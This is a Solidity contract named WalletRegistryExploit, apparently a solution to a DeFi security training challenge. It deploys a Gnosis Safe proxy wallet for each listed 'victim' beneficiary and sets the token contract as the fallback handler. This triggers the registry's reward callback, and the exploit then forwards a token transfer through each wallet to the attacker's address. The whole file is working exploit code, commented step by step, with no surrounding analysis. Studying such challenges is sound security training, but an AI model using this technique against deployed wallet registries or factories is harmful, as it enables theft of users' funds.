// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

contract WalletRegistryExploit {
    constructor(
        address registryAddress,
        address masterCopyAddress,
        IGnosisSafeProxyFactory walletFactory,
        IERC20 token,
        address[] memory victims
    ) {
        // Create a wallet for each beneficiary
        for (uint256 i = 0; i < victims.length; i++) {
            address beneficiary = victims[i];
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            address wallet = address(
                walletFactory.createProxyWithCallback(
                    masterCopyAddress, // Singleton, the Gnosis master copy
                    abi.encodeWithSelector( // Build initializer bytes array
                        IGnosisSafe.setup.selector, // Function signature to call, must be setup()
                        owners, // Must be exaclty one of the registered beneficiaries
                        1, // Threshold, must be 1
                        address(0), // Optional delegatecall address, don't care
                        0x0, // Optional delegatecall data, don't care
                        address(token), // Sepcify the token as fallback handler
                        address(0), // Payment token, don't care
                        0, // Payment, don't care
                        address(0) // Payment receiver, don't care
                    ),
                    0, // Don't care about the salt or what address the wallet gets from it
                    IProxyCreationCallback(registryAddress) // Registry has the callback to be exploited
                )
            );

            // Wallet should now have received the DVT tokens from the callback

            // We'll act as if the wallet itself is a token,
            // this transfer will be forwarded to the token contract
            IERC20(wallet).transfer(msg.sender, 10 ether);
        }
    }
}
